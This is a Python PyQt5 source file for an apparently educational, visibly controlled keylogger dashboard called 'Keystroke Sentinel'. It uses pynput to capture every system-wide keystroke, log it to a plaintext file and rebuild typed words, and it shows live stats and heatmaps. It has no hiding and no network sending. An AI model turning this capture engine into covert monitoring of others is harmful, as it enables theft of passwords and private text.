import sys, os, json, time, threading
from datetime import datetime
from collections import Counter, deque
from pathlib import Path

from PyQt5.QtWidgets import *
from PyQt5.QtCore    import *
from PyQt5.QtGui     import *

try:
    import pyqtgraph as pg
    pg.setConfigOption('background', '#050a0f')
    pg.setConfigOption('foreground', '#3a5a7a')
    HAS_PG = True
except ImportError:
    HAS_PG = False

try:
    from pynput import keyboard as kb
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

# ─── palette ──────────────────────────────────────────────────────────────────
P = {
    'bg':       '#050a0f',
    'panel':    '#090f17',
    'panel2':   '#0d1520',
    'border':   '#112233',
    'border2':  '#1a3355',
    'cyan':     '#00d4ff',
    'cyan_dim': '#004455',
    'green':    '#00ff88',
    'red':      '#ff3b3b',
    'amber':    '#ffaa00',
    'purple':   '#a855f7',
    'text':     '#aec8e0',
    'text_dim': '#334455',
    'bright':   '#e8f4ff',
    'grid':     '#0a1520',
}

LOG_FILE  = Path("keystroke_log.txt")
JSON_FILE = Path("keystroke_log.json")

SPECIAL_MAP = {
    'Key.space':     '·',
    'Key.enter':     '↵',
    'Key.backspace': '⌫',
    'Key.tab':       '→',
    'Key.shift':     '⇧',
    'Key.shift_r':   '⇧',
    'Key.ctrl_l':    'Ctrl',
    'Key.ctrl_r':    'Ctrl',
    'Key.alt_l':     'Alt',
    'Key.alt_r':     'Alt',
    'Key.caps_lock': 'Caps',
    'Key.esc':       'Esc',
    'Key.up':        '↑',
    'Key.down':      '↓',
    'Key.left':      '←',
    'Key.right':     '→',
    'Key.delete':    'Del',
    'Key.home':      'Home',
    'Key.end':       'End',
    'Key.page_up':   'PgUp',
    'Key.page_down': 'PgDn',
}

KEY_COLORS = {
    'printable': P['cyan'],
    'space':     P['text_dim'],
    'enter':     P['green'],
    'backspace': P['red'],
    'modifier':  P['amber'],
    'special':   P['purple'],
    'function':  '#5588bb',
}


# ─────────────────────────────────────────────────────────────────────────────
#  KEYSTROKE ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class KeystrokeEngine(QObject):
    key_event    = pyqtSignal(dict)   # emitted per keystroke
    error_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self._listener  = None
        self._stop_evt  = threading.Event()
        self._running   = False
        self._word_buf  = []
        self.session    = {
            'start': None, 'total': 0, 'printable': 0,
            'special': 0, 'backspaces': 0, 'enters': 0,
            'words': [], 'events': [],
            'freq': Counter(), 'cat_freq': Counter(),
            'per_second': deque(maxlen=120),
        }
        self._sec_bucket = 0
        self._sec_ts     = int(time.time())

    def start(self):
        if self._running or not HAS_PYNPUT: return
        self._running = True
        self._stop_evt.clear()
        self.session['start'] = datetime.now().isoformat()
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def _run(self):
        try:
            with kb.Listener(on_press=self._on_press,
                             on_release=self._on_release) as l:
                self._listener = l
                l.join()
        except Exception as e:
            self.error_signal.emit(str(e))

    def stop(self):
        self._running = False
        if self._listener:
            self._listener.stop()
        self._save()

    def _on_press(self, key):
        if self._stop_evt.is_set():
            return False

        now   = time.time()
        ts    = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        s     = self.session

        # Classify key
        raw   = str(key)
        char  = None
        label = ''
        cat   = 'special'

        try:
            char  = key.char
            label = char or ''
            cat   = 'printable'
        except AttributeError:
            label = SPECIAL_MAP.get(raw, raw.replace('Key.','').title())
            if raw in ('Key.space',):                              cat = 'space'
            elif raw in ('Key.enter',):                           cat = 'enter'
            elif raw in ('Key.backspace',):                       cat = 'backspace'
            elif raw in ('Key.shift','Key.shift_r',
                         'Key.ctrl_l','Key.ctrl_r',
                         'Key.alt_l','Key.alt_r'):                cat = 'modifier'
            elif raw.startswith('Key.f') and raw[5:].isdigit():   cat = 'function'

        # Stats
        s['total']    += 1
        s['cat_freq'][cat] += 1
        if cat == 'printable':
            s['printable'] += 1
            s['freq'][char] += 1
            self._word_buf.append(char)
        elif cat == 'space':
            w = ''.join(self._word_buf).strip()
            if w: s['words'].append(w)
            self._word_buf = []
        elif cat == 'enter':
            s['enters'] += 1
            w = ''.join(self._word_buf).strip()
            if w: s['words'].append(w)
            self._word_buf = []
        elif cat == 'backspace':
            s['backspaces'] += 1
            if self._word_buf: self._word_buf.pop()
        else:
            s['special'] += 1

        # Per-second bucket
        sec = int(now)
        if sec != self._sec_ts:
            s['per_second'].append(self._sec_bucket)
            self._sec_bucket = 0
            self._sec_ts     = sec
        self._sec_bucket += 1

        evt = {'ts': ts, 'unix': now, 'raw': raw,
               'label': label, 'cat': cat, 'char': char,
               'total': s['total']}
        s['events'].append(evt)
        if len(s['events']) > 2000:
            s['events'] = s['events'][-2000:]

        self.key_event.emit(evt)

        # Write to file
        self._write_char(label if cat != 'printable' else char, cat)

    def _on_release(self, key):
        pass

    def _write_char(self, text, cat):
        try:
            LOG_FILE.open('a', encoding='utf-8').write(
                text if cat == 'printable' else f'[{text}]'
            )
        except: pass

    def _save(self):
        data = {
            'session_start': self.session['start'],
            'session_end':   datetime.now().isoformat(),
            'total':         self.session['total'],
            'printable':     self.session['printable'],
            'backspaces':    self.session['backspaces'],
            'enters':        self.session['enters'],
            'top_keys':      dict(self.session['freq'].most_common(20)),
            'words':         self.session['words'][-200:],
            'events':        self.session['events'][-500:],
        }
        try:
            JSON_FILE.write_text(json.dumps(data, indent=2))
        except: pass


# ─────────────────────────────────────────────────────────────────────────────
#  LIVE KEY DISPLAY — glowing key bubbles
# ─────────────────────────────────────────────────────────────────────────────
class KeyBubble(QWidget):
    def __init__(self, label, cat, parent=None):
        super().__init__(parent)
        self.label   = label[:6]
        self.cat     = cat
        self.opacity = 1.0
        self.color   = QColor(KEY_COLORS.get(cat, P['text']))
        sz = max(38, len(self.label)*13 + 16)
        self.setFixedSize(sz, 38)
        self._anim = QPropertyAnimation(self, b'opacity_prop')
        self._anim.setDuration(1200)
        self._anim.setStartValue(1.0)
        self._anim.setEndValue(0.0)
        self._anim.setEasingCurve(QEasingCurve.OutCubic)
        self._anim.finished.connect(self.hide)
        self._anim.start()

    def get_opacity(self): return self.opacity
    def set_opacity(self, v):
        self.opacity = v
        self.update()
    opacity_prop = pyqtProperty(float, get_opacity, set_opacity)

    def paintEvent(self, e):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        p.setOpacity(self.opacity)
        c  = self.color
        bg = QColor(c.red()//6, c.green()//6, c.blue()//6)
        p.setPen(Qt.NoPen)
        p.setBrush(bg)
        p.drawRoundedRect(self.rect(), 6, 6)
        p.setPen(QPen(c, 1))
        p.setBrush(Qt.NoBrush)
        p.drawRoundedRect(self.rect().adjusted(1,1,-1,-1), 6, 6)
        f = QFont('Consolas', 11, QFont.Bold)
        p.setFont(f)
        p.setPen(c)
        p.drawText(self.rect(), Qt.AlignCenter, self.label)


class LiveKeyStream(QWidget):
    """Flowing key bubbles panel."""
    def __init__(self):
        super().__init__()
        self.setFixedHeight(100)
        self.setStyleSheet(f'background:{P["panel"]};border:1px solid {P["border"]};border-radius:8px;')
        self._layout = QHBoxLayout(self)
        self._layout.setContentsMargins(10, 10, 10, 10)
        self._layout.setSpacing(6)
        self._layout.addStretch()
        self._bubbles = deque()

    def add_key(self, label, cat):
        b = KeyBubble(label, cat, self)
        self._layout.insertWidget(self._layout.count()-1, b)
        self._bubbles.append(b)
        # Keep max 20 visible
        while len(self._bubbles) > 20:
            old = self._bubbles.popleft()
            self._layout.removeWidget(old)
            old.deleteLater()


# ─────────────────────────────────────────────────────────────────────────────
#  HEATMAP — keyboard layout visualization
# ─────────────────────────────────────────────────────────────────────────────
KEYBOARD_ROWS = [
    list('`1234567890-='),
    list('qwertyuiop[]\\'),
    list("asdfghjkl;'"),
    list('zxcvbnm,./'),
]

class KeyboardHeatmap(QWidget):
    def __init__(self):
        super().__init__()
        self.setMinimumHeight(180)
        self._freq  = {}
        self._max   = 1

    def update_freq(self, freq: dict):
        self._freq = {k.lower(): v for k, v in freq.items() if k}
        self._max  = max(self._freq.values(), default=1)
        self.update()

    def paintEvent(self, e):
        p   = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        p.fillRect(self.rect(), QColor(P['panel']))

        W, H = self.width(), self.height()
        key_w = min(int(W / 14.5), 46)
        key_h = min(int((H - 20) / 4.5), 44)
        pad   = 4

        offsets = [0, 0.5, 0.75, 1.2]
        for row_i, row in enumerate(KEYBOARD_ROWS):
            ox = int(offsets[row_i] * key_w)
            for col_i, ch in enumerate(row):
                x = 12 + ox + col_i * (key_w + pad)
                y = 10  + row_i * (key_h + pad)
                freq  = self._freq.get(ch, 0)
                ratio = freq / self._max if self._max else 0

                # Color: dark blue → cyan → white
                r = int(0   + ratio * 0)
                g = int(40  + ratio * 215)
                b = int(80  + ratio * 175)
                key_color = QColor(r, g, b)
                bg_color  = QColor(P['panel2'])

                p.setPen(Qt.NoPen)
                p.setBrush(bg_color)
                p.drawRoundedRect(x, y, key_w, key_h, 4, 4)
                if ratio > 0.02:
                    glow = QColor(key_color.red(), key_color.green(), key_color.blue(), int(ratio*200))
                    p.setBrush(glow)
                    p.drawRoundedRect(x, y, key_w, key_h, 4, 4)

                p.setPen(QPen(QColor(P['border2']), 1))
                p.setBrush(Qt.NoBrush)
                p.drawRoundedRect(x, y, key_w, key_h, 4, 4)

                label_color = QColor(key_color if ratio > 0.05 else P['text_dim'])
                p.setPen(label_color)
                f = QFont('Consolas', 9, QFont.Bold if ratio > 0.3 else QFont.Normal)
                p.setFont(f)
                p.drawText(x, y, key_w, key_h, Qt.AlignCenter, ch.upper())


# ─────────────────────────────────────────────────────────────────────────────
#  WORD CLOUD — reconstructed words display
# ─────────────────────────────────────────────────────────────────────────────
class WordCloudWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.setMinimumHeight(120)
        self._words = []

    def set_words(self, words):
        self._words = words[-60:]
        self.update()

    def paintEvent(self, e):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        p.fillRect(self.rect(), QColor(P['panel']))

        if not self._words:
            p.setPen(QColor(P['text_dim']))
            p.setFont(QFont('Consolas', 11))
            p.drawText(self.rect(), Qt.AlignCenter, 'words appear here as you type...')
            return

        counts = Counter(self._words)
        max_c  = counts.most_common(1)[0][1]
        x, y   = 12, 14
        for word, cnt in counts.most_common(40):
            ratio = cnt / max_c
            size  = int(9 + ratio * 14)
            f     = QFont('Consolas', size, QFont.Bold if ratio > 0.5 else QFont.Normal)
            fm    = QFontMetrics(f)
            tw    = fm.horizontalAdvance(word) + 10
            if x + tw > self.width() - 12:
                x  = 12
                y += size + 14
            if y > self.height() - 20: break
            alpha = int(80 + ratio * 175)
            r_v = int(0   + ratio * 0)
            g_v = int(150 + ratio * 105)
            b_v = int(180 + ratio * 75)
            p.setPen(QColor(r_v, g_v, b_v, alpha))
            p.setFont(f)
            p.drawText(x, y + size, word)
            x += tw + 6


# ─────────────────────────────────────────────────────────────────────────────
#  STAT CARD
# ─────────────────────────────────────────────────────────────────────────────
class StatCard(QFrame):
    def __init__(self, title, icon='', accent=None):
        super().__init__()
        self._accent = accent or P['cyan']
        self.setFixedHeight(100)
        self.setStyleSheet(f'''
            StatCard {{
                background: {P['panel2']};
                border: 1px solid {P['border']};
                border-radius: 10px;
            }}
        ''')
        lay = QVBoxLayout(self)
        lay.setContentsMargins(16, 12, 16, 12)
        lay.setSpacing(4)

        top = QHBoxLayout()
        self._icon_lbl = QLabel(icon)
        self._icon_lbl.setStyleSheet(f'color:{self._accent};font-size:18px;background:transparent;')
        self._title_lbl = QLabel(title.upper())
        self._title_lbl.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:10px;letter-spacing:2px;background:transparent;')
        top.addWidget(self._icon_lbl)
        top.addWidget(self._title_lbl)
        top.addStretch()
        lay.addLayout(top)

        self._val = QLabel('0')
        self._val.setStyleSheet(f'color:{self._accent};font-size:30px;font-weight:bold;font-family:"Segoe UI";background:transparent;')
        lay.addWidget(self._val)

        self._sub = QLabel('')
        self._sub.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:10px;background:transparent;')
        lay.addWidget(self._sub)

    def set_value(self, v, sub=''):
        self._val.setText(str(v))
        if sub: self._sub.setText(sub)

    def paintEvent(self, e):
        super().paintEvent(e)
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        accent = QColor(self._accent)
        p.setPen(Qt.NoPen)
        p.setBrush(accent)
        p.drawRoundedRect(0, 0, 3, self.height(), 2, 2)


# ─────────────────────────────────────────────────────────────────────────────
#  ANALYSIS PANEL — heuristic findings
# ─────────────────────────────────────────────────────────────────────────────
class AnalysisPanel(QWidget):
    def __init__(self):
        super().__init__()
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(6)

        hdr = QLabel('HEURISTIC ANALYSIS')
        hdr.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:10px;letter-spacing:2px;')
        lay.addWidget(hdr)

        self._scroll = QScrollArea()
        self._scroll.setWidgetResizable(True)
        self._scroll.setStyleSheet(f'QScrollArea{{background:transparent;border:none;}}')
        self._inner = QWidget()
        self._inner.setStyleSheet('background:transparent;')
        self._vlay  = QVBoxLayout(self._inner)
        self._vlay.setContentsMargins(0, 0, 0, 0)
        self._vlay.setSpacing(4)
        self._vlay.addStretch()
        self._scroll.setWidget(self._inner)
        lay.addWidget(self._scroll, 1)
        self._findings = []

    def add_finding(self, text, level='info'):
        colors = {'warn': P['red'], 'caution': P['amber'], 'info': P['cyan'], 'ok': P['green']}
        icons  = {'warn': '⚠', 'caution': '◈', 'info': '◉', 'ok': '✓'}
        c = colors.get(level, P['text'])
        i = icons.get(level, '•')
        if text in self._findings: return
        self._findings.append(text)

        row = QFrame()
        row.setStyleSheet(f'''
            QFrame {{
                background: {P["panel2"]};
                border: 1px solid {P["border"]};
                border-left: 3px solid {c};
                border-radius: 4px;
                padding: 2px;
            }}
        ''')
        rl = QHBoxLayout(row)
        rl.setContentsMargins(8, 6, 8, 6)
        ic = QLabel(i)
        ic.setStyleSheet(f'color:{c};font-size:13px;background:transparent;')
        ic.setFixedWidth(20)
        tx = QLabel(text)
        tx.setStyleSheet(f'color:{P["text"]};font-family:Consolas;font-size:10px;background:transparent;')
        tx.setWordWrap(True)
        rl.addWidget(ic)
        rl.addWidget(tx, 1)

        # insert before stretch
        self._vlay.insertWidget(self._vlay.count()-1, row)

    def clear(self):
        while self._vlay.count() > 1:
            item = self._vlay.takeAt(0)
            if item.widget(): item.widget().deleteLater()
        self._findings.clear()


# ─────────────────────────────────────────────────────────────────────────────
#  SCROLLING LOG TERMINAL
# ─────────────────────────────────────────────────────────────────────────────
class LogTerminal(QPlainTextEdit):
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setFont(QFont('Consolas', 11))
        self.setStyleSheet(f'''
            QPlainTextEdit {{
                background: {P["bg"]};
                color: {P["cyan"]};
                border: 1px solid {P["border"]};
                border-radius: 6px;
                padding: 8px;
                selection-background-color: {P["cyan_dim"]};
            }}
            QScrollBar:vertical {{ background:{P["bg"]}; width:5px; }}
            QScrollBar::handle:vertical {{ background:{P["border2"]}; border-radius:2px; }}
        ''')
        self.setMaximumBlockCount(500)

    def append_key(self, label, cat):
        colors = {
            'printable': P['cyan'], 'space': P['text_dim'],
            'enter':     P['green'], 'backspace': P['red'],
            'modifier':  P['amber'], 'special': P['purple'],
            'function':  '#5588bb',
        }
        c   = colors.get(cat, P['text'])
        txt = label if cat == 'printable' else f'[{label}]'
        cur = self.textCursor()
        cur.movePosition(QTextCursor.End)
        fmt = QTextCharFormat()
        fmt.setForeground(QColor(c))
        cur.insertText(txt, fmt)
        if cat == 'enter':
            cur.insertBlock()
        self.setTextCursor(cur)
        self.ensureCursorVisible()


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN WINDOW
# ─────────────────────────────────────────────────────────────────────────────
class KeySentinel(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Keystroke Sentinel — Educational Demo')
        self.engine = KeystrokeEngine()
        self.engine.key_event.connect(self._on_key)
        self.engine.error_signal.connect(self._on_error)
        self._running = False
        self._pending = []
        self._lock    = threading.Lock()

        self._apply_theme()
        self._build_ui()
        self.showMaximized()

        # Flush timer
        self._flush = QTimer()
        self._flush.timeout.connect(self._flush_events)
        self._flush.start(80)

        # Stats refresh
        self._refresh = QTimer()
        self._refresh.timeout.connect(self._update_stats)
        self._refresh.start(500)

        # Clock
        self._clock = QTimer()
        self._clock.timeout.connect(self._tick)
        self._clock.start(1000)
        self._elapsed = 0

        if not HAS_PYNPUT:
            QTimer.singleShot(500, lambda: QMessageBox.warning(
                self, 'Missing Dependency',
                'pynput is not installed.\n\nRun: pip install pynput\n\nCapture will not work until installed.'
            ))

    def _apply_theme(self):
        self.setStyleSheet(f'''
            QMainWindow, QWidget {{
                background: {P['bg']};
                color: {P['text']};
                font-family: "Segoe UI", sans-serif;
                font-size: 12px;
            }}
            QTabWidget::pane {{
                border: 1px solid {P['border']};
                background: {P['panel']};
                border-radius: 0 6px 6px 6px;
            }}
            QTabBar::tab {{
                background: {P['bg']};
                color: {P['text_dim']};
                padding: 9px 22px;
                border: 1px solid {P['border']};
                border-bottom: none;
                border-radius: 6px 6px 0 0;
                font-family: Consolas;
                font-size: 11px;
                letter-spacing: 1px;
                margin-right: 2px;
            }}
            QTabBar::tab:selected {{
                background: {P['panel']};
                color: {P['cyan']};
                border-top: 2px solid {P['cyan']};
            }}
            QTabBar::tab:hover {{ color: {P['text']}; }}
            QPushButton {{
                background: {P['panel2']};
                color: {P['text']};
                border: 1px solid {P['border2']};
                border-radius: 6px;
                padding: 8px 20px;
                font-family: Consolas;
                font-size: 11px;
                font-weight: bold;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{ background: {P['border']}; border-color: {P['cyan']}; }}
            QPushButton#startBtn {{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
                    stop:0 #004455, stop:1 #006677);
                color: {P['cyan']};
                border: 1px solid {P['cyan']};
            }}
            QPushButton#startBtn:hover {{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
                    stop:0 #006677, stop:1 #008899);
            }}
            QPushButton#stopBtn {{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
                    stop:0 #440000, stop:1 #660000);
                color: {P['red']};
                border: 1px solid {P['red']};
            }}
            QPushButton#stopBtn:hover {{ background: #550000; }}
            QScrollBar:vertical {{ background:{P['bg']}; width:5px; border:none; }}
            QScrollBar::handle:vertical {{ background:{P['border2']}; border-radius:2px; }}
            QScrollBar:horizontal {{ background:{P['bg']}; height:5px; border:none; }}
            QScrollBar::handle:horizontal {{ background:{P['border2']}; border-radius:2px; }}
            QGroupBox {{
                border: 1px solid {P['border']};
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 6px;
                font-family: Consolas;
                font-size: 10px;
                color: {P['text_dim']};
                letter-spacing: 2px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 6px;
                background: {P['bg']};
            }}
            QSplitter::handle {{ background: {P['border']}; }}
            QLabel {{ background: transparent; }}
        ''')

    # ── Build UI ──────────────────────────────────────────────────────────────
    def _build_ui(self):
        root = QWidget()
        self.setCentralWidget(root)
        rl = QVBoxLayout(root)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(0)

        rl.addWidget(self._build_header())
        rl.addWidget(self._build_toolbar())

        # Stat cards row
        cards = QWidget()
        cards.setFixedHeight(110)
        cards.setStyleSheet(f'background:{P["bg"]};border-bottom:1px solid {P["border"]};')
        cl = QHBoxLayout(cards)
        cl.setContentsMargins(16, 8, 16, 8)
        cl.setSpacing(10)
        self.c_total  = StatCard('Total Keys',  '⌨',  P['cyan'])
        self.c_chars  = StatCard('Printable',   'Aa', P['green'])
        self.c_words  = StatCard('Words',       '◈',  P['purple'])
        self.c_backs  = StatCard('Backspaces',  '⌫',  P['red'])
        self.c_enters = StatCard('Enters',      '↵',  P['amber'])
        self.c_rate   = StatCard('Keys / sec',  '⚡',  '#5588bb')
        for c in [self.c_total, self.c_chars, self.c_words,
                  self.c_backs, self.c_enters, self.c_rate]:
            cl.addWidget(c)
        rl.addWidget(cards)

        # Protocol color bar
        self.proto_bar = QWidget()
        self.proto_bar.setFixedHeight(4)
        self.proto_bar.setStyleSheet(f'background:{P["border"]};')
        rl.addWidget(self.proto_bar)

        # Tabs
        self.tabs = QTabWidget()
        rl.addWidget(self.tabs, 1)

        self.tabs.addTab(self._build_live_tab(),     '  ◉ LIVE CAPTURE  ')
        self.tabs.addTab(self._build_analysis_tab(), '  ◈ ANALYSIS  ')
        self.tabs.addTab(self._build_heatmap_tab(),  '  ⌨ HEATMAP  ')
        self.tabs.addTab(self._build_risk_tab(),     '  ⚠ RISK  ')

        # Status bar
        sb = QStatusBar()
        sb.setStyleSheet(f'background:{P["panel"]};color:{P["text_dim"]};border-top:1px solid {P["border"]};font-family:Consolas;font-size:10px;')
        self.setStatusBar(sb)
        self._status_lbl = QLabel('Ready  |  pynput required for live capture  |  Educational use only')
        sb.addWidget(self._status_lbl)
        self._clock_lbl = QLabel('00:00:00')
        self._clock_lbl.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:10px;')
        sb.addPermanentWidget(self._clock_lbl)

    def _build_header(self):
        h = QFrame()
        h.setFixedHeight(62)
        h.setStyleSheet(f'''
            QFrame {{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
                    stop:0 {P["panel2"]}, stop:1 {P["panel"]});
                border-bottom: 1px solid {P["border"]};
            }}
        ''')
        hl = QHBoxLayout(h)
        hl.setContentsMargins(20, 0, 20, 0)

        # Logo
        logo_row = QHBoxLayout()
        logo_row.setSpacing(10)
        icon = QLabel('⬡')
        icon.setStyleSheet(f'color:{P["cyan"]};font-size:26px;background:transparent;')
        title = QLabel('Keystroke Sentinel')
        title.setStyleSheet(f'color:{P["bright"]};font-size:18px;font-weight:bold;background:transparent;letter-spacing:-0.5px;')
        sub = QLabel('// educational keylogger simulation')
        sub.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:11px;background:transparent;')
        logo_row.addWidget(icon)
        logo_row.addWidget(title)
        logo_row.addWidget(sub)
        hl.addLayout(logo_row)
        hl.addStretch()

        # Live indicator
        self._indicator = QLabel('● IDLE')
        self._indicator.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:12px;font-weight:bold;background:transparent;')
        hl.addWidget(self._indicator)

        # Disclaimer badge
        disc = QLabel('  EDUCATIONAL USE ONLY  ')
        disc.setStyleSheet(f'''
            QLabel {{
                color:{P["red"]};
                background:#1a0505;
                border:1px solid {P["red"]};
                border-radius:4px;
                font-family:Consolas;
                font-size:10px;
                font-weight:bold;
                padding:4px 8px;
            }}
        ''')
        hl.addWidget(disc)
        return h

    def _build_toolbar(self):
        bar = QFrame()
        bar.setFixedHeight(52)
        bar.setStyleSheet(f'background:{P["panel"]};border-bottom:1px solid {P["border"]};')
        bl = QHBoxLayout(bar)
        bl.setContentsMargins(16, 0, 16, 0)
        bl.setSpacing(10)

        self.start_btn = QPushButton('▶  START CAPTURE')
        self.start_btn.setObjectName('startBtn')
        self.start_btn.setFixedWidth(160)
        self.start_btn.clicked.connect(self.start_capture)
        bl.addWidget(self.start_btn)

        self.stop_btn = QPushButton('■  STOP')
        self.stop_btn.setObjectName('stopBtn')
        self.stop_btn.setFixedWidth(100)
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_capture)
        bl.addWidget(self.stop_btn)

        self.clear_btn = QPushButton('⊘  Clear')
        self.clear_btn.setFixedWidth(90)
        self.clear_btn.clicked.connect(self.clear_all)
        bl.addWidget(self.clear_btn)

        sep = QFrame(); sep.setFrameShape(QFrame.VLine)
        sep.setStyleSheet(f'color:{P["border"]};'); bl.addWidget(sep)

        save_btn = QPushButton('↓  Save JSON')
        save_btn.clicked.connect(self._save_json)
        bl.addWidget(save_btn)

        load_btn = QPushButton('↑  Load JSON')
        load_btn.clicked.connect(self._load_json)
        bl.addWidget(load_btn)

        export_btn = QPushButton('↓  Export TXT')
        export_btn.clicked.connect(self._export_txt)
        bl.addWidget(export_btn)

        bl.addStretch()

        # Elapsed
        self._elapsed_lbl = QLabel('00:00:00')
        self._elapsed_lbl.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:13px;background:transparent;')
        bl.addWidget(self._elapsed_lbl)

        return bar

    # ── LIVE TAB ──────────────────────────────────────────────────────────────
    def _build_live_tab(self):
        w   = QWidget()
        lay = QHBoxLayout(w)
        lay.setContentsMargins(12, 12, 12, 12)
        lay.setSpacing(10)

        # Left: terminal + bubble stream
        left = QVBoxLayout()
        left.setSpacing(8)

        # Bubble stream
        grp1 = QGroupBox('LIVE KEY STREAM')
        gl1  = QVBoxLayout(grp1)
        self.key_stream = LiveKeyStream()
        gl1.addWidget(self.key_stream)
        left.addWidget(grp1)

        # Terminal log
        grp2 = QGroupBox('KEYSTROKE LOG')
        gl2  = QVBoxLayout(grp2)
        self.terminal = LogTerminal()
        gl2.addWidget(self.terminal)
        left.addWidget(grp2, 1)

        # Word cloud
        grp3 = QGroupBox('RECONSTRUCTED WORDS')
        gl3  = QVBoxLayout(grp3)
        self.word_cloud = WordCloudWidget()
        gl3.addWidget(self.word_cloud)
        left.addWidget(grp3)

        lay.addLayout(left, 3)

        # Right: charts
        right = QVBoxLayout()
        right.setSpacing(8)

        # Timeline
        if HAS_PG:
            grp4 = QGroupBox('KEYSTROKES / SECOND')
            gl4  = QVBoxLayout(grp4)
            self.tl_plot  = pg.PlotWidget()
            self.tl_plot.setFixedHeight(140)
            self.tl_plot.setBackground(P['panel'])
            self.tl_plot.showGrid(y=True, alpha=0.15)
            self.tl_plot.getAxis('left').setTextPen(pg.mkPen(P['text_dim']))
            self.tl_plot.getAxis('bottom').setTextPen(pg.mkPen(P['text_dim']))
            self.tl_curve = self.tl_plot.plot(pen=pg.mkPen(P['cyan'], width=1.5))
            fill_base = self.tl_plot.plot([0],[0], pen=pg.mkPen(None))
            self.tl_fill = pg.FillBetweenItem(self.tl_curve, fill_base,
                                              brush=pg.mkBrush(0,212,255,25))
            self.tl_plot.addItem(self.tl_fill)
            gl4.addWidget(self.tl_plot)
            right.addWidget(grp4)

            # Category bar chart
            grp5 = QGroupBox('KEY CATEGORY BREAKDOWN')
            gl5  = QVBoxLayout(grp5)
            self.cat_plot = pg.PlotWidget()
            self.cat_plot.setFixedHeight(160)
            self.cat_plot.setBackground(P['panel'])
            self.cat_plot.showGrid(y=True, alpha=0.15)
            gl5.addWidget(self.cat_plot)
            right.addWidget(grp5)

        # Analysis findings
        grp6 = QGroupBox('HEURISTIC FINDINGS')
        gl6  = QVBoxLayout(grp6)
        self.analysis = AnalysisPanel()
        gl6.addWidget(self.analysis)
        right.addWidget(grp6, 1)

        lay.addLayout(right, 2)
        return w

    # ── ANALYSIS TAB ──────────────────────────────────────────────────────────
    def _build_analysis_tab(self):
        w   = QWidget()
        lay = QGridLayout(w)
        lay.setContentsMargins(12, 12, 12, 12)
        lay.setSpacing(10)

        # Top keys table
        grp1 = QGroupBox('TOP 20 MOST PRESSED KEYS')
        gl1  = QVBoxLayout(grp1)
        self.top_keys_tbl = self._make_table(['Key', 'Count', '% Total', 'Bar'])
        self.top_keys_tbl.setColumnWidth(3, 200)
        gl1.addWidget(self.top_keys_tbl)
        lay.addWidget(grp1, 0, 0)

        # Words table
        grp2 = QGroupBox('RECONSTRUCTED WORDS')
        gl2  = QVBoxLayout(grp2)
        self.words_tbl = self._make_table(['Word', 'Frequency', 'Suspicious?'])
        gl2.addWidget(self.words_tbl)
        lay.addWidget(grp2, 0, 1)

        # Session info
        grp3 = QGroupBox('SESSION STATISTICS')
        gl3  = QVBoxLayout(grp3)
        self.session_tbl = self._make_table(['Metric', 'Value'])
        self.session_tbl.setColumnWidth(0, 200)
        gl3.addWidget(self.session_tbl)
        lay.addWidget(grp3, 1, 0)

        # Category breakdown
        grp4 = QGroupBox('CATEGORY BREAKDOWN')
        gl4  = QVBoxLayout(grp4)
        self.cat_tbl = self._make_table(['Category', 'Count', 'Description'])
        gl4.addWidget(self.cat_tbl)
        lay.addWidget(grp4, 1, 1)

        lay.setRowStretch(0, 1)
        lay.setRowStretch(1, 1)
        lay.setColumnStretch(0, 1)
        lay.setColumnStretch(1, 1)
        return w

    # ── HEATMAP TAB ───────────────────────────────────────────────────────────
    def _build_heatmap_tab(self):
        w   = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(12, 12, 12, 12)
        lay.setSpacing(10)

        grp1 = QGroupBox('KEYBOARD FREQUENCY HEATMAP')
        gl1  = QVBoxLayout(grp1)
        self.heatmap = KeyboardHeatmap()
        self.heatmap.setMinimumHeight(220)
        gl1.addWidget(self.heatmap)

        legend_row = QHBoxLayout()
        legend_row.addStretch()
        for label, color in [('Never pressed', P['panel2']), ('Low', '#004455'),
                              ('Medium', '#008899'), ('High', '#00d4ff')]:
            box = QFrame(); box.setFixedSize(12, 12)
            box.setStyleSheet(f'background:{color};border-radius:2px;')
            lbl = QLabel(label)
            lbl.setStyleSheet(f'color:{P["text_dim"]};font-family:Consolas;font-size:10px;background:transparent;')
            legend_row.addWidget(box)
            legend_row.addWidget(lbl)
            legend_row.addSpacing(12)
        gl1.addLayout(legend_row)
        lay.addWidget(grp1)

        # Bigram analysis (pairs of keys)
        grp2 = QGroupBox('MOST COMMON KEY SEQUENCES')
        gl2  = QVBoxLayout(grp2)
        self.bigram_tbl = self._make_table(['Sequence', 'Count', 'Context'])
        gl2.addWidget(self.bigram_tbl)
        lay.addWidget(grp2, 1)

        return w

